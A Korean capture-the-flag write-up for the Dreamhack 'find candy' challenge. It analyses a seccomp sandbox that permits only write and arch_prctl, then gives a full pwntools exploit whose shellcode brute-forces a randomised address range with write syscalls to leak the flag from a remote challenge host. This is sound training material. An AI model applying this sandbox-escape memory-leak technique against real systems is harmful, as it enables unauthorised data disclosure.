dreamhack find candy writeup
==============

## 1. 코드 분석

```python
flag_mem = mmap((void *)((((uint64_t)rand() << 12) & 0x0000fffff000) | 0x080000000000), ...);
```

실행 시마다 플래그를 무작위 주소에 배치한다. (rand를 사용해 0x080000000000 대역의 특정 위치에 플래그를 로드)    

```python
void Sandbox() {
    scmp_filter_ctx ctx;

    if ((ctx = seccomp_init(SCMP_ACT_KILL)) == NULL)
        HandleError("seccomp error");

    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(arch_prctl), 0);

    if (seccomp_load(ctx) < 0) {
      seccomp_release(ctx);
      HandleError("seccomp error");
    }
    seccomp_release(ctx);

    arch_prctl(ARCH_SET_FS, NULL);
    arch_prctl(ARCH_SET_GS, NULL);
}
```

* Sandbox 함수(seccomp)에서 허용된 시스템 콜 write, arch_prctl 단 두 개뿐이다.
* open, read, execve 같은 일반적인 시스템 콜은 SCMP_ACT_KILL에 의해 프로그램이 즉시 종료
* arch_prctl(ARCH_SET_FS, NULL)을 호출, TLS 등에 접근하는 것을 차단


```python
// Create a space for shellcode and initialize it.
sh = mmap((void *)0xbeefdead000, 0x1000, 7, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
if (sh == MAP_FAILED)
	HandleError("mmap error");

memset(sh, 0x90, 0x1000);
memcpy(sh, stub, sizeof(stub) - 1);

// Create a stack space for rsp.
stack_mem = mmap((void *)0xdeadbeef000, 0x1000, PROT_WRITE | PROT_READ, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
if (stack_mem == MAP_FAILED)
	HandleError("mmap error");

// Get and execute shellcode.
puts("find me :) ");
sleep(1);
printf("shellcode: ");
read(0, sh + sizeof(stub) - 1, 1000);

// sys_write and sys_arch_prctl are allowed.
// sys_arch_prctl is used to initialize fs and gs.
Sandbox();
asm("mov %0, %%rsp" :: "r"(stack_mem));
asm("add $0x800, %rsp");

asm("mov %0, %%rax" :: "r"(sh));

fd = 0;
sh = 0;
flag_mem = 0;
stack_mem = 0;

asm("jmp *%rax");
```

* 0xbeefdead000 주소에 실행 권한(RWX)이 있는 메모리를 할당하고 입력을 받는다.
* stub 코드가 먼저 실행되어 모든 레지스터를 0으로 초기화한다. 
* 실행 직전 모든 포인터 변수(fd, sh, flag_mem 등)를 0으로 밀어버린다.


## 2. 익스플로잇

### 2.1 익스플로잇 전략

seccomp로 인해 sandbox 함수에서 허용된 시스템 콜은 write, arch_prctl 함수이다. 따라서 write 함수를 이용한다면 임의의 메모리 영역의 데이터를 출력할 수 있다.  
현재 플래그가 존재할 수 있는 범위의 시작점($0x80000000000$)은 알고 있으므로 브루트포스로 범위를 높여가며 write를 시도한다. 


### 2.2 익스플로잇 코드

```python
from pwn import *

BASE_ADDR = 0x80000000000
context.arch = 'amd64'

p = remote('host3.dreamhack.games', 10396)

sc = 'mov r8, 0x0\n'

sc += 'loop:'
sc += 'mov rdi, 0x1\n' 
sc += 'mov r9, r8\n'
sc += 'shl r9, 0xc\n'
sc += 'mov rax, 0x80000000000\n' 
sc += 'or r9, rax\n'
sc += 'mov rsi, r9\n'
sc += 'mov rdx, 0x1000\n' 
sc += 'mov rax, 0x1\n' 
sc += 'syscall\n'

sc += 'inc r8\n'
sc += 'cmp r8, 0x100000\n'
sc += 'jle loop\n'

p.sendafter(b'shellcode: ', asm(sc))
p.interactive()
```

### 3. 실행 결과


<img width="1012" height="177" alt="image" src="https://github.com/user-attachments/assets/284137a3-24fc-4b95-aeb1-478deb112bad" />
